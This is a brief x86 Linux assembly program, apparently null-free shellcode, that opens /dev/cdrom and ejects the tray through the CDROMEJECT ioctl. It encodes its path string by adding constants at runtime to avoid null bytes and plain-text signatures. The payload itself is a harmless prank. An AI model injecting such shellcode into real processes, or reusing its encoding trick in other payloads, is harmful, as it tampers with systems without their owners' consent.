section .text
    global _start
 
_start:
    ; open("/dev/cdrom", O_RDONLY | O_NONBLOCK);
    mov al, 5
    cdq
    push edx
    push word 0x6d6f
    push 0x6153521e
    pop edx
    add edx, 0x11111111
    push edx
    push 0x6554531e
    pop edx
    add edx, 0x11111111
    push edx
    nop
    nop
    mov ebx, esp
    mov cx, 0xfff
    sub cx, 0x7ff
    int 0x80
 
    ; ioctl(fd, CDROMEJECT, 0);
    mov ebx, eax
    mov al, 54
    mov cx, 0x5309
    cdq
    int 0x80